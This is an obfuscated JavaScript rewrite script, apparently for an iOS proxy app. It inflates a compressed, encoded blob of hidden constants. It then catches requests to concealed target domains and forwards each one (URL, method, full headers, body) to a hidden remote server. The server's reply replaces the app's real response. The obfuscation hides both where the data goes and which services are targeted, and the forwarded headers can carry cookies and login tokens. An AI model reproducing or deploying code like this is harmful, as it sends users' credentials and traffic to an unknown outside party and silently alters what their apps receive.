(function(){let c=['eNptU1lu2zAQvYogFP2pLC9JHddFUMROnE3ZnfWnoCRaoiORNEnZcYrepj1AgV6pQI/RmZHSoEB/bL6ZN8M3j6Mv/nU08Id+zlnKjfUDfx4jfuRct1ghlhxCt0jp9gP/nrhjJR2XrjVda8xKKlBGZEKyokk2Of1P7toUEDMU2xmNd/cm+weHR8fRyenZ+cXl1fT65vbu/oHFScpnWS7mj0UplV4Y66rl6mn93On2Njbf97cGH961oRFDNf1OpxP4S+qZMscgzkllwWXmcoBvCM6MKsc5M2OVorBnKnCi5KpygDMacRD4Ag/w/0hVOMbQg7wiCIc9KoxVuh4xy/ubEFpELyEAtrbTOW2H7XbOchbiT2ZUpUMb23Yj8pD6GG61khYVraiw5C5XKcA1wU/5NpzPiMu0LkTCnFCyPbdKfkxgHMvdduVmrQHQrv5Lg8SIelXk/i6ZFvgTGjjwP1PRZaPDO8eW3p4xygD5gMgbYDWxksa/HXQsoZB1RshMzHD0afQaAVjGzbJInqAaCN0RQyuLDR4I/Pr24/fP7wArotPN5Hhcd1MlmpM25ljLMsSzeiILKxuWLA4TEK8KHjrOSqYd4BJYBbGW3bCDa4cAVsVRMGl22NV7ekSXa6MSuAJw1LiyqLh13kSZFTOpN2Gi4Pg4T2ReL/BP611OEq5xpHOCV9wsufFO/qq9rLujtYB2GpuYq/Cqm/oqtvJeloHGHxNLyKSoUo68fQq8XeJCHEf1S4vQliBJpDCKcOtm7BPM9vCzuIjqJZvDC5Dw/NVkL+UO5rH+1z+ZGzUA'],d,P,L=String.fromCharCode,M=Uint8Array,j=Uint16Array,w=Uint32Array;var f=typeof window==='object'&&window||typeof self==='object'&&self||exports;(function(d){var H='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',y=function(q){var i={};for(var k=0,$=q.length;k<$;k++)i[q.charAt(k)]=k;return i}(H),n=function(q){var $,I,k,i=q.length;$=i%4,I=(i>0?y[q.charAt(0)]<<18:0)|(i>1?y[q.charAt(1)]<<12:0)|(i>2?y[q.charAt(2)]<<6:0)|(i>3?y[q.charAt(3)]:0),k=[L(I>>>16),L(I>>>8&255),L(I&255)],k.length-=[0,0,2,1][$];return k.join('')},o=function(i){return i.replace(/\S{1,4}/g,n)};d.atob=function(i){return o(String(i).replace(/[^A-Za-z0-9\+\/]/g,''))}}(f),function($){var W,v,k,Q,h,a,U,R=8,V=!0,y=void 0;function N(l){throw l}function b(l,T){var x,F;x=void 0,this.input=l,this.c=0;if(T||!(T={})){T.index&&(this.c=T.index),T.verify&&(this.N=T.verify)}F=l[this.c++],x=l[this.c++];switch(F&15){case R:this.method=R}0!==((F<<8)+x)%31&&N(Error('err:'+((F<<8)+x)%31)),x&32&&N(Error('not')),this.B=new r(l,{index:this.c,bufferSize:T.bufferSize,bufferType:T.bufferType,resize:T.resize})}b.prototype.p=function(){var F,x,l=this.input;F=void 0,x=void 0,F=this.B.p(),this.c=this.B.c,this.N&&(x=(l[this.c++]<<24|l[this.c++]<<16|l[this.c++]<<8|l[this.c++])>>>0,x!==jb(F)&&N(Error('i32c')));return F};var d=0,K=1;function r(l,x){this.l=[],this.m=32768,this.e=this.g=this.c=this.q=0,this.input=m?new M(l):l,this.s=!1,this.n=K,this.C=!1;if(x||!(x={})){x.index&&(this.c=x.index),x.bufferSize&&(this.m=x.bufferSize),x.bufferType&&(this.n=x.bufferType),x.resize&&(this.C=x.resize)}switch(this.n){case d:this.b=32768,this.a=new(m?M:Array)(32768+this.m+258);break;case K:this.b=0,this.a=new(m?M:Array)(this.m),this.f=this.K,this.t=this.I,this.o=this.J;break;default:N(Error('imd'))}}r.prototype.K=function(T){var z,x,l,A,f,F,Z;x=this.input.length/this.c+1|0,l=void 0,z=void 0,A=void 0,f=this.input,F=this.a,T&&('number'===typeof T.v&&(x=T.v),'number'===typeof T.G&&(x+=T.G)),2>x?(l=(f.length-this.c)/this.u[2],A=258*(l/2)|0,z=A<F.length?F.length+A:F.length<<1):z=F.length*x,m?(Z=new M(z),Z.set(F)):Z=F;return this.a=Z},r.prototype.I=function(){var x,l;x=this.b,m?this.C?(l=new M(x),l.set(this.a.subarray(0,x))):l=this.a.subarray(0,x):(this.a.length>x&&(this.a.length=x),l=this.a);return this.buffer=l},r.prototype.J=function(T,A){var x=this.a,l=this.b;this.u=T;for(var z=x.length,e,f,F,Z;256!==(e=E(this,T));)if(256>e){l>=z&&(x=this.f(),z=x.length),x[l++]=e}else{f=e-257,Z=n[f],0<D[f]&&(Z+=X(this,D[f])),e=E(this,A),F=H[e],0<q[e]&&(F+=X(this,q[e])),l+Z>z&&(x=this.f(),z=x.length);for(;Z--;)x[l]=x[l++-F]}for(;8<=this.e;)this.e-=8,this.c--;this.b=l};function o(F){var Z=F.length,x=0,g=Number.POSITIVE_INFINITY,T,e,f,dU,z,A,l,fU,p,GU;for(fU=0;fU<Z;++fU)F[fU]>x&&(x=F[fU]),F[fU]<g&&(g=F[fU]);T=1<<x,e=new(m?w:Array)(T),f=1,dU=0;for(z=2;f<=x;){for(fU=0;fU<Z;++fU)if(F[fU]===f){A=0,l=dU;for(p=0;p<f;++p)A=A<<1|l&1,l>>=1;GU=f<<16|fU;for(p=A;p<T;p+=z)e[p]=GU;++dU}++f,dU<<=1,z<<=1}return[e,x,g]};function E(l,g){for(var z=l.g,GU=l.e,F=l.input,T=l.c,f=F.length,A=g[0],x=g[1],e,Z;GU<x&&!(T>=f);)z|=F[T++]<<GU,GU+=8;e=A[z&(1<<x)-1],Z=e>>>16,l.g=z>>Z,l.e=GU-Z,l.c=T;return e&65535}function i(z){var T,A;function e(e,Z,F){var z,l=this.z,g,f;for(f=0;f<e;)GU:switch(z=E(this,Z),z){case 16:for(g=3+X(this,2);g--;)F[f++]=l;break GU;case 17:for(g=3+X(this,3);g--;)F[f++]=0;l=0;break GU;case 18:for(g=11+X(this,7);g--;)F[f++]=0;l=0;break GU;default:l=F[f++]=z}this.z=l;return F}var F=X(z,5)+257,l=X(z,5)+1,Z=X(z,4)+4,g=new(m?M:Array)(I.length),f;T=void 0,A=void 0;var x;for(x=0;x<Z;++x)g[I[x]]=X(z,3);if(!m){x=Z;for(Z=g.length;x<Z;++x)g[I[x]]=0}f=o(g),T=new(m?M:Array)(F),A=new(m?M:Array)(l),z.z=0,z.o(o(e.call(z,F,f,T)),o(e.call(z,l,f,A)))}function X(T,Z){for(var x=T.g,l=T.e,z=T.input,A=T.c,f=z.length,F;l<Z;)A>=f&&N(Error('bk')),x|=z[A++]<<l,l+=8;F=x&(1<<Z)-1,T.g=x>>>Z,T.e=l-Z,T.c=A;return F}r.prototype.p=function(){for(;!this.s;){var Z=X(this,3);Z&1&&(this.s=V),Z>>>=1;A:switch(Z){case 0:var fU,z,GU=this.input,F=this.c,l=this.a,e=this.b;fU=GU.length;var f=y;z=y;var g=l.length,x=y;this.e=this.g=0,F+1>=fU&&N(Error('iL')),f=GU[F++]|GU[F++]<<8,F+1>=fU&&N(Error('iN')),z=GU[F++]|GU[F++]<<8,f===~z&&N(Error('ih')),F+f>GU.length&&N(Error('ib'));T:switch(this.n){case d:for(;e+f>l.length;){x=g-e,f-=x;if(m){l.set(GU.subarray(F,F+x),e),e+=x,F+=x}else{for(;x--;)l[e++]=GU[F++]}this.b=e,l=this.f(),e=this.b}break T;case K:for(;e+f>l.length;)l=this.f({v:2});break T;default:N(Error('im'))}if(m){l.set(GU.subarray(F,F+f),e),e+=f,F+=f}else{for(;f--;)l[e++]=GU[F++]}this.c=F,this.b=e,this.a=l;break A;case 1:this.o(C,s);break A;case 2:i(this);break A;default:N(Error('e: '+Z))}}return Y(this.t())};var t='undefined',m=t!==typeof M&&t!==typeof j&&t!==typeof w&&t!==typeof DataView;Q=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15];var I=m?new j(Q):Q;k=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258];var n=m?new j(k):k;v=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0];var D=m?new M(v):v;W=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577];var H=m?new j(W):W;h=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13];var q=m?new M(h):h,B=new(m?M:Array)(288),J;U=void 0,J=0;for(U=B.length;J<U;++J)B[J]=143>=J?8:255>=J?9:279>=J?7:8;var C=o(B),S=new(m?M:Array)(30),u;a=void 0,u=0;for(a=S.length;u<a;++u)S[u]=5;var s=o(S);function Y(T){var Z,l,x;Z=void 0;var A,e,z;l='',Z=T.length,x=0;while(x<Z){A=T[x++];F:switch(A>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:l+=L(A);break F;case 12:case 13:e=T[x++],l+=L((A&31)<<6|e&63);break F;case 14:e=T[x++],z=T[x++],l+=L((A&15)<<12|(e&63)<<6|(z&63)<<0);break F}}return l}$.d=function(c){let l=new b(new M($.atob(c).split('').map(F=>F.charCodeAt(0))),{}),x=l.p();return x}}(f)),d=typeof window==='object'&&window||typeof self==='object'&&self||typeof global==='object'&&global;let G=true;for(let O of c){O=f.d(O),O=JSON.parse(O);if(G){Object.assign(d,O)}else{d.StringExtract=O}}}());const TARGET_DOMAINS=[KL8,fL8],BASE_FORWARD_URL=sL8,scriptURL=$argument||'',VERSION=lL8,FORWARD_URL=scriptURL?oL8+BASE_FORWARD_URL+yL8+encodeURIComponent(scriptURL)+GL8+encodeURIComponent(VERSION)+oL8:BASE_FORWARD_URL;if($request&&TARGET_DOMAINS[bL8]($=>$request[BL8][CL8]($))){const originalUrl=$request[BL8],method=$request[wL8],headers=$request[UL8],body=$request[qL8],originalContentType=headers[YL8]||headers[tL8]||'';let bodyEncoded='';if(body){try{if(body instanceof Uint8Array){let binary='';for(let i=rL8;i<body[eL8];i++)binary+=String[$L8](body[i]);bodyEncoded=customBtoa(binary)}else{if(typeof body===TL8){bodyEncoded=customBtoa(body)}}}catch(e){$notification[XL8](ZL8,e[dL8],kL8+typeof body+oL8),$done({[AL8]:QL8})}}const data={[pb8]:originalUrl,[wL8]:method,[UL8]:headers,[Eb8]:bodyEncoded,[nb8]:originalContentType};$httpClient[XL8]({[BL8]:FORWARD_URL,[UL8]:{[YL8]:Sb8,[mb8]:jb8,[Nb8]:Sb8},[qL8]:JSON[cb8](data),[zb8]:aL8},function(A,$,data){if(A){$notification[XL8](Lb8,hb8,ub8+JSON[cb8](A)+oL8),$done({[AL8]:QL8})}else{try{const T=JSON[Rb8](data);if(T[dL8]){$notification[XL8](Pb8,'',T[dL8])}if(T[Jb8]===!0){$done({})}else{const $={[Ib8]:{[AL8]:ML8,[UL8]:{[YL8]:Ob8},[qL8]:JSON[cb8](T[vb8])}};$done($)}}catch(e){$notification[XL8](_b8,e[dL8],Vb8+data+oL8),$done({[AL8]:QL8})}}})}else{$done({})}function customBtoa(T){const Q=rb8;let d='',i=rL8;while(i<T[eL8]){const k=T[ab8](i++),Z=i<T[eL8]?T[ab8](i++):rL8,$=i<T[eL8]?T[ab8](i++):rL8,A=k<<WL8|Z<<iL8|$;d+=Q[A>>gL8&HL8],d+=Q[A>>xL8&HL8],d+=i>T[eL8]+FL8?'=':Q[A>>DL8&HL8],d+=i>T[eL8]?'=':Q[A&HL8]}return d}
